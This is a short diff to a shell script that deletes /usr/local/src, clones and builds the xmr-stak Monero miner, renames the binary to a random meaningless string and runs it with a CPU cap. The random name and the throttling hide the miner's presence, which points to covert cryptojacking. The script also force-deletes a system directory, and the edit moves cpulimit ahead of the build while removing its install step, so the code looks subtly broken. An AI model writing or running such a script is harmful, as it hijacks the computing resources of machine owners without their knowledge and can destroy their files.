@@ -8,6 +8,7 @@ rm -r /usr/local/src
 mkdir /usr/local/src
 git clone https://github.com/fireice-uk/xmr-stak.git /usr/local/src &&
 a='nwmtjxvcxt-00' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
+sudo cpulimit --exe "$cpuname" -l 300 &&
 cd /usr/local/src
 mkdir build
 cd build 
@@ -54,6 +55,5 @@ sudo cp xmr-stak "$cpuname"
 rm xmr-stak
 echo $cpuname" is starting"
 ./"${cpuname}"
-sudo apt-get install cpulimit &&
-sudo cpulimit --exe "$cpuname" -l 300
+
 
